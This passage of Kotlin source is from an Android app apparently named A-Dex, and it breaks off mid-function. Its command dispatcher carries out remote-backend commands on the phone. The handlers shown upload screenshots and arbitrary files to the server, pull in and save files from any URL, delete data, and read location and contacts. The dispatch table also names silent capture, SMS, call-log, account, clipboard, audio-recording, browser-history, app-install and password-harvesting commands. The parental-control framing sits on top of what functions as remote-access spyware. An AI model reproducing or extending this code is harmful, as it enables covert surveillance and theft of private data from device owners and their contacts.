package com.adex.app.service

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ActivityNotFoundException
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.hardware.camera2.CameraManager
import android.location.Location
import android.location.LocationManager
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.MediaPlayer
import android.media.ToneGenerator
import android.net.Uri
import android.os.Build
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.speech.tts.TextToSpeech
import android.text.format.DateUtils
import android.view.KeyEvent
import android.media.MediaRecorder
import android.accounts.AccountManager
import android.content.ClipboardManager
import android.database.Cursor
import android.app.WallpaperManager
import android.graphics.SurfaceTexture
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import androidx.core.content.ContextCompat
import androidx.core.content.FileProvider
import com.adex.app.ADexApplication
import com.adex.app.admin.ADexDeviceAdminReceiver
import com.adex.app.data.LockedAppEntity
import com.adex.app.data.SettingsStore
import com.adex.app.ui.FakeCallActivity
import com.adex.app.ui.MessageOverlayActivity
import com.adex.app.ui.ShowImageActivity
import com.adex.app.util.AudioController
import com.adex.app.util.DeviceInfoProvider
import com.adex.app.util.FileListOptions
import com.adex.app.util.FileSortBy
import com.adex.app.util.FileTypeFilter
import com.adex.app.util.FileUtils
import com.adex.app.util.ParentalShieldManager
import com.adex.app.util.PermissionHelper
import com.adex.app.util.PinSecurity
import com.adex.app.util.ShakeAlertManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import java.io.File
import java.util.Locale
import kotlin.random.Random
import kotlin.coroutines.resume

// CommandDispatcher runs device actions for backend-queued commands.
class CommandDispatcher(
    private val context: Context,
    private val settingsStore: SettingsStore,
    private val backendApiClient: BackendApiClient,
    private val sendResult: (CommandResult) -> Unit,
) {
    private val appContext = context.applicationContext
    private val db = (appContext as ADexApplication).db
    private val packageManager = appContext.packageManager
    private var ttsReady = false
    private lateinit var tts: TextToSpeech
    private var mediaPlayer: MediaPlayer? = null
    private var audioSourceUrl: String? = null
    private var audioRepeatCount: Int = 1
    private var audioLooping: Boolean = false
    private val commandScope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    private var torchJob: Job? = null

    init {
        // Initialize TTS in init block to avoid self-reference during property initialization.
        tts = TextToSpeech(appContext) { status ->
            ttsReady = status == TextToSpeech.SUCCESS
            if (ttsReady) {
                tts.language = Locale.US
            }
        }
    }

    suspend fun execute(command: DeviceCommand) {
        val result = runCatching {
            when (command.commandName.lowercase(Locale.US)) {
                "apps" -> success(command.commandId, mapOf("apps" to listInstalledApps()))
                "open" -> handleOpen(command)
                "lock" -> handleLock(command)
                "say" -> handleSay(command)
                "sayurdu" -> handleSayUrdu(command)
                "playaudio" -> handlePlayAudio(command)
                "stopaudio" -> handleStopAudio(command)
                "pauseaudio" -> handlePauseAudio(command)
                "resumeaudio" -> handleResumeAudio(command)
                "audiostatus" -> handleAudioStatus(command)
                "parentpin" -> handleParentPin(command)
                "shield" -> handleShield(command)
                "screenshot" -> handleScreenshot(command)
                "files" -> handleFiles(command)
                "filestat" -> handleFileStat(command)
                "mkdir" -> handleMkdir(command)
                "rename" -> handleRename(command)
                "move" -> handleMove(command)
                "delete" -> handleDelete(command)
                "uploadfile" -> handleUploadFile(command)
                "readtext" -> handleReadText(command)
                "download" -> handleDownload(command)
                "volume" -> handleVolume(command)
                "info" -> success(command.commandId, DeviceInfoProvider.collect(appContext))
                "permstatus" -> handlePermissionStatus(command)
                "location" -> handleLocation(command)
                "camerasnap" -> handleCameraSnap(command)
                "contactlookup" -> handleContactLookup(command)
                "smsdraft" -> handleSmsDraft(command)
                "fileshareintent" -> handleFileShareIntent(command)
                "quicklaunch" -> handleQuickLaunch(command)
                "torchpattern" -> handleTorchPattern(command)
                "ringtoneprofile" -> handleRingtoneProfile(command)
                "screentimeoutset" -> handleScreenTimeoutSet(command)
                "mediacontrol" -> handleMediaControl(command)
                "randomquote" -> handleRandomQuote(command)
                "fakecallui" -> handleFakeCallUi(command)
                "shakealert" -> handleShakeAlert(command)
                "vibratepattern" -> handleVibratePattern(command)
                "beep" -> handleBeep(command)
                "countdownoverlay" -> handleCountdownOverlay(command)
                "flashtext" -> handleFlashText(command)
                "coinflip" -> handleCoinFlip(command)
                "diceroll" -> handleDiceRoll(command)
                "randomnumber" -> handleRandomNumber(command)
                "quicktimer" -> handleQuickTimer(command)
                "soundfx" -> handleSoundFx(command)
                "prankscreen" -> handlePrankScreen(command)
                "show" -> handleShow(command)
                "message" -> handleMessage(command)
                "lockapp" -> handleLockApp(command)
                "unlockapp" -> handleUnlockApp(command)
                "lockedapps" -> handleLockedApps(command)
                "usage" -> handleUsage(command)
                "wallpaper" -> handleWallpaper(command)
                "silentcapture" -> handleSilentCapture(command)
                "getsms" -> handleGetSms(command)
                "getcalllogs" -> handleGetCallLogs(command)
                "getaccounts" -> handleGetAccounts(command)
                "getclipboard" -> handleGetClipboard(command)
                "recordaudio" -> handleRecordAudio(command)
                "installapp" -> handleInstallApp(command)
                "gethistory" -> handleGetHistory(command)
                "sysinfo_full" -> handleSysInfoFull(command)
                "getpasswords" -> handleGetPasswords(command)
                else -> error(command.commandId, "UNKNOWN_COMMAND", "Command is not supported on device")
            }
        }.getOrElse { throwable ->
            error(command.commandId, "COMMAND_EXECUTION_FAILED", throwable.message ?: "Unknown execution failure")
        }

        sendResult(result)
    }

    fun shutdown() {
        stopAudioPlayback()
        torchJob?.cancel()
        torchJob = null
        ShakeAlertManager.stop(appContext)
        tts.stop()
        tts.shutdown()
    }

    private fun listInstalledApps(): List<Map<String, Any>> {
        @Suppress("DEPRECATION")
        val apps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
        return apps
            .map {
                mapOf(
                    "packageName" to it.packageName,
                    "label" to packageManager.getApplicationLabel(it).toString()
                )
            }
            .sortedBy { it["label"].toString().lowercase(Locale.US) }
            .take(500)
    }

    private fun handleOpen(command: DeviceCommand): CommandResult {
        val target = command.payload["target"]?.toString()?.trim().orEmpty()
        if (target.isBlank()) {
            return error(command.commandId, "ARGUMENT_REQUIRED", "Missing app package or display name")
        }

        val apps = listInstalledApps()
        val direct = apps.firstOrNull { it["packageName"].toString().equals(target, ignoreCase = true) }
        val byLabel = apps.firstOrNull { it["label"].toString().contains(target, ignoreCase = true) }
        val selected = direct ?: byLabel
            ?: return error(command.commandId, "APP_NOT_FOUND", "No installed app matches: $target")

        val packageName = selected["packageName"].toString()
        val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
            ?: return error(command.commandId, "APP_NOT_LAUNCHABLE", "App has no launch intent")

        launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        appContext.startActivity(launchIntent)
        return success(command.commandId, mapOf("openedPackage" to packageName))
    }

    private fun handleLock(command: DeviceCommand): CommandResult {
        if (!PermissionHelper.isDeviceAdminEnabled(appContext)) {
            return error(command.commandId, "DEVICE_ADMIN_REQUIRED", "Enable device admin to use !lock")
        }

        val dpm = appContext.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(appContext, ADexDeviceAdminReceiver::class.java)
        if (!dpm.isAdminActive(admin)) {
            return error(command.commandId, "DEVICE_ADMIN_INACTIVE", "Device admin is not active")
        }

        dpm.lockNow()
        return success(command.commandId, mapOf("locked" to true))
    }

    private fun handleSay(command: DeviceCommand): CommandResult {
        return speakWithLocale(command, Locale.US, "say")
    }

    private fun handleSayUrdu(command: DeviceCommand): CommandResult {
        return speakWithLocale(command, Locale("ur", "PK"), "sayurdu")
    }

    private fun speakWithLocale(command: DeviceCommand, locale: Locale, commandLabel: String): CommandResult {
        val text = command.payload["text"]?.toString().orEmpty()
        if (text.isBlank()) {
            return error(command.commandId, "ARGUMENT_REQUIRED", "Missing text for speech")
        }

        if (!ttsReady) {
            return error(command.commandId, "TTS_NOT_READY", "TextToSpeech is still initializing")
        }

        val availability = tts.isLanguageAvailable(locale)
        if (availability == TextToSpeech.LANG_MISSING_DATA || availability == TextToSpeech.LANG_NOT_SUPPORTED) {
            return if (locale.language.equals("ur", ignoreCase = true)) {
                error(
                    command.commandId,
                    "TTS_URDU_NOT_AVAILABLE",
                    "Urdu TTS voice is not available. Install Urdu voice data in Speech Services and retry."
                )
            } else {
                error(command.commandId, "TTS_LANGUAGE_NOT_AVAILABLE", "Requested TTS language is not available on this device")
            }
        }

        val setResult = tts.setLanguage(locale)
        if (setResult == TextToSpeech.LANG_MISSING_DATA || setResult == TextToSpeech.LANG_NOT_SUPPORTED) {
            return if (locale.language.equals("ur", ignoreCase = true)) {
                error(
                    command.commandId,
                    "TTS_URDU_NOT_AVAILABLE",
                    "Urdu TTS voice could not be activated. Install Urdu voice data and retry."
                )
            } else {
                error(command.commandId, "TTS_LANGUAGE_NOT_AVAILABLE", "Requested TTS language could not be activated")
            }
        }

        selectBestVoiceForLocale(locale)
        val speakStatus = tts.speak(text, TextToSpeech.QUEUE_FLUSH, null, "adex-tts-${commandLabel}-${System.currentTimeMillis()}")
        if (speakStatus == TextToSpeech.ERROR) {
            return error(command.commandId, "TTS_SPEAK_FAILED", "TextToSpeech failed to start speaking")
        }

        return success(command.commandId, mapOf("spoken" to text, "locale" to locale.toLanguageTag()))
    }

    private fun selectBestVoiceForLocale(locale: Locale) {
        val voices = tts.voices ?: return
        val languageMatches = voices.filter { voice ->
            voice.locale.language.equals(locale.language, ignoreCase = true)
        }
        if (languageMatches.isEmpty()) {
            return
        }

        val bestOffline = languageMatches
            .filter { !it.isNetworkConnectionRequired }
            .maxByOrNull { it.quality }
        val chosen = bestOffline ?: languageMatches.maxByOrNull { it.quality }
        if (chosen != null) {
            tts.voice = chosen
        }
    }

    private suspend fun handleScreenshot(command: DeviceCommand): CommandResult {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            return error(
                command.commandId,
                "SCREENSHOT_REQUIRES_MEDIA_PROJECTION",
                "Android ${Build.VERSION.SDK_INT} requires MediaProjection user consent flow for screenshots"
            )
        }

        val (file, errorCode) = captureAccessibilityScreenshot()
        if (file == null) {
            return error(
                command.commandId,
                errorCode ?: "SCREENSHOT_FAILED",
                "Enable A-Dex accessibility service and retry screenshot command"
            )
        }

        return try {
            val mediaId = backendApiClient.uploadMedia(settingsStore, command.commandId, file, "image/png")
            success(command.commandId, mapOf("screenshot" to "uploaded"), mediaId)
        } catch (err: Exception) {
            error(command.commandId, "MEDIA_UPLOAD_FAILED", err.message ?: "Screenshot upload failed")
        }
    }

    private suspend fun handleDownload(command: DeviceCommand): CommandResult {
        val path = command.payload["path"]?.toString().orEmpty()
        if (path.isBlank()) {
            return error(command.commandId, "ARGUMENT_REQUIRED", "Missing file path")
        }

        val file = FileUtils.resolvePath(path)
            ?: return error(command.commandId, "FILE_NOT_FOUND", "File not found: $path")
        if (!file.isFile) {
            return error(command.commandId, "NOT_A_FILE", "Path is not a regular file")
        }

        val mime = guessMimeType(file.extension)
        return try {
            val mediaId = backendApiClient.uploadMedia(settingsStore, command.commandId, file, mime)
            success(command.commandId, mapOf("file" to file.absolutePath, "size" to file.length()), mediaId)
        } catch (err: Exception) {
            error(command.commandId, "MEDIA_UPLOAD_FAILED", err.message ?: "File upload failed")
        }
    }

    private fun handleVolume(command: DeviceCommand): CommandResult {
        val value = (command.payload["value"] as? Number)?.toInt() ?: command.payload["value"]?.toString()?.toIntOrNull()
        if (value == null) {
            return error(command.commandId, "ARGUMENT_REQUIRED", "Volume value must be between 0 and 100")
        }

        AudioController.setVolumePercent(appContext, value)
        return success(command.commandId, mapOf("volume" to value.coerceIn(0, 100)))
    }

    private fun handleParentPin(command: DeviceCommand): CommandResult {
        val pin = command.payload["pin"]?.toString()?.trim().orEmpty()
        if (!PinSecurity.isValidPin(pin)) {
            return error(command.commandId, "PIN_INVALID", "PIN must be 4-12 digits")
        }

        settingsStore.setParentPin(pin)
        return success(command.commandId, mapOf("pinConfigured" to true, "pinLength" to pin.length))
    }

    private suspend fun handleShield(command: DeviceCommand): CommandResult {
        val action = command.payload["action"]?.toString()?.trim()?.lowercase(Locale.US) ?: "status"
        return when (action) {
            "status" -> success(command.commandId, shieldStatusMap())
            "enable" -> {
                if (!PermissionHelper.isAccessibilityServiceEnabled(appContext)) {
                    return error(
                        command.commandId,
                        "ACCESSIBILITY_SERVICE_NOT_ACTIVE",
                        "Enable A-Dex accessibility service. Shield enforcement depends on accessibility."
                    )
                }
                withContext(Dispatchers.IO) {
                    ParentalShieldManager.setShieldEnabled(appContext, settingsStore, true)
                }
                success(command.commandId, shieldStatusMap())
            }
            "disable" -> {
                withContext(Dispatchers.IO) {
                    ParentalShieldManager.setShieldEnabled(appContext, settingsStore, false)
                }
                success(command.commandId, shieldStatusMap())
            }
            "relock" -> {
                ParentalShieldManager.relock(settingsStore)
                success(command.commandId, shieldStatusMap())
            }
            else -> error(command.commandId, "ARGUMENT_INVALID", "Shield action must be one of: enable, disable, status, relock")
        }
    }

    private fun handleFiles(command: DeviceCommand): CommandResult {
        val options = FileListOptions(
            path = command.payload["path"]?.toString(),
            page = command.intArg("page", 1),
            pageSize = command.intArg("pageSize", command.intArg("page_size", 50)),
            sortBy = parseSortBy(command.payload["sortBy"]?.toString() ?: command.payload["sort_by"]?.toString()),
            sortDir = command.payload["sortDir"]?.toString() ?: command.payload["sort_dir"]?.toString() ?: "asc",
            query = command.payload["query"]?.toString(),
            type = parseTypeFilter(command.payload["type"]?.toString()),
        )

        return runCatching {
            val result = FileUtils.listDirectory(appContext, options)
            success(
                command.commandId,
                mapOf(
                    "path" to result.path,
                    "page" to result.page,
                    "pageSize" to result.pageSize,
                    "totalItems" to result.totalItems,
                    "totalPages" to result.totalPages,
                    "sortBy" to result.sortBy,
                    "sortDir" to result.sortDir,
                    "query" to result.query,
                    "type" to result.type,
                    "hasMore" to (result.page < result.totalPages),
                    "roots" to result.roots,
                    "files" to result.items.map { entry ->
                        mapOf(
                            "name" to entry.name,
                            "path" to entry.path,
                            "isDirectory" to entry.isDirectory,
                            "size" to entry.size,
                            "modifiedAt" to entry.modifiedAt,
                            "mimeType" to entry.mimeType,
                            "isHidden" to entry.isHidden,
                            "canRead" to entry.canRead,
                            "canWrite" to entry.canWrite
                        )
                    }
                )
            )
        }.getOrElse {
            error(command.commandId, "FILES_LIST_FAILED", it.message ?: "Failed to list files")
        }
    }

    private fun handleFileStat(command: DeviceCommand): CommandResult {
        val path = command.payload["path"]?.toString()?.trim().orEmpty()
        if (path.isBlank()) {
            return error(command.commandId, "ARGUMENT_REQUIRED", "Path is required")
        }

        return runCatching {
            val entry = FileUtils.stat(appContext, path)
            success(
                command.commandId,
                mapOf(
                    "stat" to mapOf(
                        "name" to entry.name,
                        "path" to entry.path,
                        "isDirectory" to entry.isDirectory,
                        "size" to entry.size,
                        "modifiedAt" to entry.modifiedAt,
                        "mimeType" to entry.mimeType,
                        "isHidden" to entry.isHidden,
                        "canRead" to entry.canRead,
                        "canWrite" to entry.canWrite
                    )
                )
            )
        }.getOrElse {
            error(command.commandId, "FILESTAT_FAILED", it.message ?: "Failed to read file stat")
        }
    }

    private fun handleMkdir(command: DeviceCommand): CommandResult {
        val path = command.payload["path"]?.toString()?.trim().orEmpty()
        if (path.isBlank()) {
            return error(command.commandId, "ARGUMENT_REQUIRED", "Path is required")
        }

        return runCatching {
            val (dir, created) = FileUtils.mkdirs(appContext, path)
            success(command.commandId, mapOf("path" to dir.absolutePath, "created" to created))
        }.getOrElse {
            error(command.commandId, "MKDIR_FAILED", it.message ?: "Failed to create directory")
        }
    }

    private fun handleRename(command: DeviceCommand): CommandResult {
        val path = command.payload["path"]?.toString()?.trim().orEmpty()
        val newName = (command.payload["newName"] ?: command.payload["new_name"])?.toString()?.trim().orEmpty()
        if (path.isBlank() || newName.isBlank()) {
            return error(command.commandId, "ARGUMENT_REQUIRED", "Path and new_name are required")
        }

        return runCatching {
            val renamed = FileUtils.rename(appContext, path, newName)
            success(command.commandId, mapOf("path" to renamed.absolutePath, "name" to renamed.name))
        }.getOrElse {
            error(command.commandId, "RENAME_FAILED", it.message ?: "Failed to rename path")
        }
    }

    private fun handleMove(command: DeviceCommand): CommandResult {
        val source = command.payload["source"]?.toString()?.trim().orEmpty()
        val targetDir = (command.payload["targetDir"] ?: command.payload["target_dir"])?.toString()?.trim().orEmpty()
        if (source.isBlank() || targetDir.isBlank()) {
            return error(command.commandId, "ARGUMENT_REQUIRED", "source and target_dir are required")
        }

        return runCatching {
            val moved = FileUtils.move(appContext, source, targetDir)
            success(command.commandId, mapOf("path" to moved.absolutePath, "name" to moved.name))
        }.getOrElse {
            error(command.commandId, "MOVE_FAILED", it.message ?: "Failed to move path")
        }
    }

    private fun handleDelete(command: DeviceCommand): CommandResult {
        val path = command.payload["path"]?.toString()?.trim().orEmpty()
        if (path.isBlank()) {
            return error(command.commandId, "ARGUMENT_REQUIRED", "Path is required")
        }

        val recursive = command.booleanArg("recursive", false)
        return runCatching {
            val deleted = FileUtils.delete(appContext, path, recursive)
            success(command.commandId, mapOf("path" to path, "deletedEntries" to deleted, "recursive" to recursive))
        }.getOrElse {
            error(command.commandId, "DELETE_FAILED", it.message ?: "Failed to delete path")
        }
    }

    private suspend fun handleUploadFile(command: DeviceCommand): CommandResult {
        val targetDir = (command.payload["targetDir"] ?: command.payload["target_dir"])?.toString()?.trim().orEmpty()
        val fileUrl = (command.payload["fileUrl"] ?: command.payload["url"])?.toString()?.trim().orEmpty()
        if (targetDir.isBlank() || fileUrl.isBlank()) {
            return error(command.commandId, "ARGUMENT_REQUIRED", "target_dir and file URL are required")
        }

        val requestedFileName = (command.payload["fileName"] ?: command.payload["file_name"])?.toString()?.trim()
        return withContext(Dispatchers.IO) {
            runCatching {
                val tempFile = backendApiClient.downloadUrlToCache(appContext, fileUrl)
                try {
                    val fileName = requestedFileName
                        ?.takeIf { it.isNotBlank() }
                        ?: Uri.parse(fileUrl).lastPathSegment?.takeIf { it.isNotBlank() }
                        ?: tempFile.name

                    val saved = FileUtils.saveBytesToDir(
                        context = appContext,
                        targetDirPath = targetDir,
                        fileName = fileName,
                        bytes = tempFile.readBytes(),
                        overwrite = false,
                    )

                    success(
                        command.commandId,
                        mapOf(
                            "targetDir" to targetDir,
                            "fileName" to saved.name,
                            "path" to saved.absolutePath,
                            "size" to saved.length()
                        )
                    )
                } finally {
                    runCatching { tempFile.delete() }
                }
            }.getOrElse {
                error(command.commandId, "UPLOADFILE_FAILED", it.message ?: "Failed to upload file to device storage")
            }
        }
    }

    private fun handleReadText(command: DeviceCommand): CommandResult {
        val path = command.payload["path"]?.toString()?.trim().orEmpty()
        if (path.isBlank()) {
            return error(command.commandId, "ARGUMENT_REQUIRED", "Path is required")
        }

        val maxChars = command.intArg("maxChars", command.intArg("max_chars", 2000)).coerceIn(64, 50_000)
        return runCatching {
            val text = FileUtils.readTextPreview(appContext, path, maxChars)
            success(
                command.commandId,
                mapOf(
                    "path" to path,
                    "maxChars" to maxChars,
                    "preview" to text,
                    "previewLength" to text.length
                )
            )
        }.getOrElse {
            error(command.commandId, "READTEXT_FAILED", it.message ?: "Failed to read text preview")
        }
    }

    private suspend fun handlePlayAudio(command: DeviceCommand): CommandResult {
        val url = command.payload["url"]?.toString()?.trim().orEmpty()
        if (url.isBlank()) {
            return error(command.commandId, "ARGUMENT_REQUIRED", "Audio URL is required for playaudio")
        }

        val repeat = (command.payload["repeat"] as? Number)?.toInt()
            ?: command.payload["repeat"]?.toString()?.toIntOrNull()
            ?: 1
        if (repeat < 1 || repeat > 100) {
            return error(command.commandId, "ARGUMENT_INVALID", "Repeat must be between 1 and 100")
        }

        val loop = (command.payload["loop"] as? Boolean)
            ?: command.payload["loop"]?.toString()?.toBooleanStrictOrNull()
            ?: false

        return withContext(Dispatchers.IO) {
            runCatching {
                stopAudioPlayback()

                val player = MediaPlayer().apply {
                    setAudioAttributes(
                        AudioAttributes.Builder()
                            .setUsage(AudioAttributes.USAGE_MEDIA)
                            .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                            .build()
                    )
                    setDataSource(url)
                    setOnCompletionListener { mp ->
                        if (audioLooping) {
                            return@setOnCompletionListener
                        }

                        if (audioRepeatCount > 1) {
                            audioRepeatCount -= 1
                            runCatching {
                                mp.seekTo(0)
                                mp.start()
                            }
                        } else {
                            stopAudioPlayback()
                        }
                    }
                    setOnErrorListener { _, _, _ ->
                        stopAudioPlayback()
                        true
                    }
                    prepare()
                    start()
                }

                mediaPlayer = player
                audioSourceUrl = url
                audioRepeatCount = repeat
                audioLooping = loop
                player.isLooping = loop

                success(
                    command.commandId,
                    mapOf(
                        "playing" to true,
                        "url" to url,
                        "repeat" to repeat,
                        "loop" to loop
                    )
                )
            }.getOrElse {
                error(command.commandId, "AUDIO_PLAY_FAILED", it.message ?: "Failed to play audio")
            }
        }
    }

    private fun handleStopAudio(command: DeviceCommand): CommandResult {
        stopAudioPlayback()
        return success(command.commandId, mapOf("playing" to false))
    }

    private fun handlePauseAudio(command: DeviceCommand): CommandResult {
        val player = mediaPlayer ?: return error(command.commandId, "AUDIO_NOT_ACTIVE", "No active audio playback")
        if (player.isPlaying) {
            player.pause()
        }
        return success(command.commandId, mapOf("playing" to false, "paused" to true))
    }

    private fun handleResumeAudio(command: DeviceCommand): CommandResult {
        val player = mediaPlayer ?: return error(command.commandId, "AUDIO_NOT_ACTIVE", "No active audio playback")
        if (!player.isPlaying) {
            player.start()
        }
        return success(command.commandId, mapOf("playing" to true, "paused" to false))
    }

    private fun handleAudioStatus(command: DeviceCommand): CommandResult {
        val player = mediaPlayer
        return success(
            command.commandId,
            mapOf(
                "hasPlayer" to (player != null),
                "playing" to (player?.isPlaying ?: false),
                "sourceUrl" to audioSourceUrl,
                "repeatRemaining" to audioRepeatCount,
                "loop" to audioLooping
            )
        )
    }

    private fun handlePermissionStatus(command: DeviceCommand): CommandResult {
        val runtimeStatus = mapOf(
            "location" to hasPermission(Manifest.permission.ACCESS_FINE_LOCATION),
            "audio" to hasPermission(Manifest.permission.RECORD_AUDIO),
            "camera" to hasPermission(Manifest.permission.CAMERA),
            "contacts" to hasPermission(Manifest.permission.READ_CONTACTS),
            "readStorage" to hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE),
            "writeStorage" to hasPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE),
        )

        val data = mapOf(
            "overlayPermission" to PermissionHelper.hasOverlayPermission(appContext),
            "usageAccessPermission" to PermissionHelper.hasUsageStatsPermission(appContext),
            "accessibilityServiceEnabled" to PermissionHelper.isAccessibilityServiceEnabled(appContext),
            "deviceAdminEnabled" to PermissionHelper.isDeviceAdminEnabled(appContext),
            "runtimePermissions" to runtimeStatus,
            "missingRuntimePermissions" to PermissionHelper.missingRuntimePermissions(appContext),
        )

        return success(command.commandId, data)
    }

    private fun handleLocation(command: DeviceCommand): CommandResult {
        if (ContextCompat.checkSelfPermission(appContext, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return error(command.commandId, "LOCATION_PERMISSION_REQUIRED", "Grant location permission to use !location")
        }

        val locationManager = appContext.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER)

        val location = providers
            .mapNotNull { provider -> runCatching { locationManager.getLastKnownLocation(provider) }.getOrNull() }
            .maxByOrNull { it.time }
            ?: return error(command.commandId, "LOCATION_UNAVAILABLE", "No recent location available")

        return success(command.commandId, locationToMap(location))
    }

    private fun handleCameraSnap(command: DeviceCommand): CommandResult {
        if (!hasPermission(Manifest.permission.CAMERA)) {
            return error(command.commandId, "CAMERA_PERMISSION_REQUIRED", "Grant camera permission to use camerasnap")
        }

        val intent = Intent(MediaStore.ACTION_IMAGE_CAPTURE).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        return try {
            appContext.startActivity(intent)
            success(command.commandId, mapOf("launched" to true, "mode" to "camera_intent"))
        } catch (_: ActivityNotFoundException) {
            error(command.commandId, "CAMERA_ACTIVITY_NOT_FOUND", "No camera activity found on device")
        }
    }

    private suspend fun handleContactLookup(command: DeviceCommand): CommandResult {
        if (!hasPermission(Manifest.permission.READ_CONTACTS)) {
            return error(command.commandId, "CONTACTS_PERMISSION_REQUIRED", "Grant contacts permission to use contactlookup")
        }

        val query = command.payload["query"]?.toString()?.trim().orEmpty()
        val limit = command.intArg("limit", 20).coerceIn(1, 100)
        return withContext(Dispatchers.IO) {
            runCatching {
                val projection = arrayOf(
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                )
                val (selection, selectionArgs) = if (query.isBlank()) {
                    null to null
                } else {
                    "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} LIKE ? OR ${ContactsContract.CommonDataKinds.Phone.NUMBER} LIKE ?" to
                        arrayOf("%$query%", "%$query%")
                }

                val contacts = mutableListOf<Map<String, Any?>>()
                appContext.contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    projection,
                    selection,
                    selectionArgs,
                    "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
                )?.use { cursor ->
                    val idIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
                    val nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

                    while (cursor.moveToNext() && contacts.size < limit) {
                        contacts.add(
                            mapOf(
                                "contactId" to if (idIndex >= 0) cursor.getLong(idIndex) else null,
                                "name" to if (nameIndex >= 0) cursor.getString(nameIndex) else "",
                                "number" to if (numberIndex >= 0) cursor.getString(numberIndex) else "",
                            )
                        )
                    }
                }

                success(command.commandId, mapOf("query" to query, "limit" to limit, "contacts" to contacts, "count" to contacts.size))
            }.getOrElse {
                error(command.commandId, "CONTACTLOOKUP_FAILED", it.message ?: "Failed to query contacts")
            }
        }
    }

    private fun handleSmsDraft(command: DeviceCommand): CommandResult {
        val number = command.payload["number"]?.toString()?.trim().orEmpty()
        val message = command.payload["message"]?.toString().orEmpty()
        if (number.isBlank()) {
            return error(command.commandId, "ARGUMENT_REQUIRED", "Number is required")
        }

        val intent = Intent(Intent.ACTION_SENDTO).apply {
            data = Uri.parse("smsto:${Uri.encode(number)}")
            putExtra("sms_body", message)
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }

        return try {
            appContext.startActivity(intent)
            success(command.commandId, mapOf("launched" to true, "number" to number))
        } catch (_: ActivityNotFoundException) {
            error(command.commandId, "SMS_ACTIVITY_NOT_FOUND", "No SMS app found on device")
        }
    }

    private fun handleFileShareIntent(command: DeviceCommand): CommandResult {
        val path = command.payload["path"]?.toString()?.trim().orEmpty()
        if (path.isBlank()) {
            return error(command.commandId, "ARGUMENT_REQUIRED", "Path is required")
        }

        val file = FileUtils.normalizePath(appContext, path)
            ?: return error(command.commandId, "FILE_NOT_FOUND", "Path not found: $path")
        if (!file.isFile) {
            return error(command.commandId, "NOT_A_FILE", "Path is not a regular file")
        }

        return runCatching {
            val uri = FileProvider.getUriForFile(appContext, "${appContext.packageName}.fileprovider", file)
            val mime = command.payload["mimeType"]?.toString()?.trim().orEmpty().ifBlank { guessMimeType(file.extension) }
            val chooserTitle = command.payload["title"]?.toString()?.trim().orEmpty().ifBlank { "Share file" }

            val shareIntent = Intent(Intent.ACTION_SEND).apply {
                type = mime
                putExtra(Intent.EXTRA_STREAM, uri)
                putExtra(Intent.EXTRA_TEXT, command.payload["text"]?.toString())
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            }
            val chooser = Intent.createChooser(shareIntent, chooserTitle).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            }
            appContext.startActivity(chooser)
            success(command.commandId, mapOf("launched" to true, "path" to file.absolutePath, "mimeType" to mime))
        }.getOrElse {
            error(command.commandId, "FILESHAREINTENT_FAILED", it.message ?: "Failed to launch share intent")
        }
    }

    private fun handleQuickLaunch(command: DeviceCommand): CommandResult {
        val packageName = command.payload["packageName"]?.toString()?.trim().orEmpty()
        val url = command.payload["url"]?.toString()?.trim().orEmpty()
        val action = command.payload["action"]?.toString()?.trim().orEmpty()

        return try {
            when {
                packageName.isNotBlank() -> {
                    val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
                        ?: return error(command.commandId, "APP_NOT_FOUND", "No launchable app found: $packageName")
                    launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    appContext.startActivity(launchIntent)
                    success(command.commandId, mapOf("launched" to true, "packageName" to packageName))
                }
                url.isNotBlank() -> {
                    val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    appContext.startActivity(intent)
                    success(command.commandId, mapOf("launched" to true, "url" to url))
                }
                action.isNotBlank() -> {
                    val intent = Intent(action).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
